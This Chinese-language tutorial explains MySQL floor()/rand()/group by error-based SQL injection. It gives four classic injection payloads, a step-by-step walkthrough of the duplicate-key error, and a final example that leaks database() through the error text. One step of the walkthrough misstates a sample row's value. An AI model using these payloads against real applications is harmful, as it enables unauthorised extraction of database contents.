# floor() 报错注入

> 💡原理：利用floor、count、group by冲突报错

> 💡条件：数据库记录必须3条及以上（在随机因子取0时）

#### 经典语句

***

```sql
1.
and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+
2.
and (select 1 from (select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2)))a) --+
3.
union select null,count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a 
4.
union select null,null,count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2)) --+
```

#### 随机因子的决定性

***

-   当`floor(rand()*2)` 中的rand()函数不取随机因子，则出现的01值是随机无规律的
-   当`floor(rand()*2)` 中的rand()函数取固定值，比如0时，出现的01值是有规律的

> 🚩 `floor(rand(0)*2)` 的前12位值为：011011001110

#### 报错过程

***

假设：数据表 table

| id | name |
| -- | ---- |
| 1  | a    |
| 2  | b    |
| 3  | a    |

-   正常sql语句 `select count(*) from table group by name`  的执行过程
    -   过程：新建一个临时表
        | name | count |
        | ---- | ----- |
        1.  读取第一条数据，name为a，临时表中没这个key，新建key，并且count+1
            | name | count |
            | ---- | ----- |
            | a    | 1     |
        2.  读取第二条数据，name为b，临时表中没这个key，新建key，并且count+1
            | name | count |
            | ---- | ----- |
            | a    | 1     |
            | b    | 1     |
        3.  读取第三条数据，name为b，临时表中有这个key，count直接+1
            | name | count |
            | ---- | ----- |
            | a    | 1     |
            | b    | 2     |
        4.  读取结束输出结果
            | count |
            | ----- |
            | 1     |
            | 2     |
-   floor报错语句`select count(*) from table group by floor(rand(0)*2)`  的执行过程

    此时表table实际为
    | id | name | floor(rand(0)\*2) |
    | -- | ---- | ----------------- |
    | 1  | a    | floor(rand(0)\*2) |
    | 2  | b    | floor(rand(0)\*2) |
    | 3  | a    | floor(rand(0)\*2) |
    -   过程：新建一个临时表
        | floor(rand(0)\*2) | count |
        | ----------------- | ----- |
        1.  读取第一条数据，floor(rand(0)\*2)计算值为**0**（第一次值**0**11011），临时表中没这个key，新建key，并且count+1
            > 💡新建key时不是直接把0值放入，而是把`floor(rand(0)*2)`的值放入，因此在新建key时，会再一次计算`floor(rand(0)*2)`的值，此时计算的值为**1**（第二次值0**1**1011）
            > \| floor(rand(0)\*2) | count |
            > \| ----------------- | ----- |
            > \| 1                 | 1     |
        2.  读取第二条数据,floor(rand(0)\*2)计算值为**1**（第三次值01**1**011），临时表中有这个key，count直接+1
            | floor(rand(0)\*2) | count |
            | ----------------- | ----- |
            | 1                 | 2     |
        3.  读取第三条数据,floor(rand(0)\*2)计算值为**0**（第四次值011**0**11），临时表中没这个key，新建key，并且count+1
            > 💡此时把`floor(rand(0)*2)`的值放入时，计算的值是**1**（第五次值0110**1**1）
            > \| floor(rand(0)\*2) | count |
            > \| ----------------- | ----- |
            > \| 1                 | 2     |
            > \| 1                 | 1     |
            > 💡此时会发现`floor(rand(0)*2)`的key出现两个1，但是在这个临时表中`floor(rand(0)*2)` 是主key不能重复，因此会报错说明数据表中已有1这个值`Duplicate entry '1' for key '<group_key>'`

#### 为什么需要随机因子？

***

🌈 假设随机值为0110**0**1，则在读取第三条数据时，计算的第五次值为0，则会成功写入到临时表中，则此时临时表为

| floor(rand(0)\*2) | count |
| ----------------- | ----- |
| 1                 | 2     |
| 0                 | 1     |

🌈 此时，无论后面的值是0还是1，在临时表中都已有这个key，不会再新建key，只有count值在累计，就不会有机会出现重复key的报错

#### 结论

***

🌈 因为报错信息会显示已有的键值，因此只要在键值放入我们需要的信息就能进行信息泄露

🌈 比如，将`floor(rand(0)*2)` 改为`concat(floor(rand(0)*2),database())` ,则报错信息就变为

`Duplicate entry '1databasename' for key '<group_key>'`
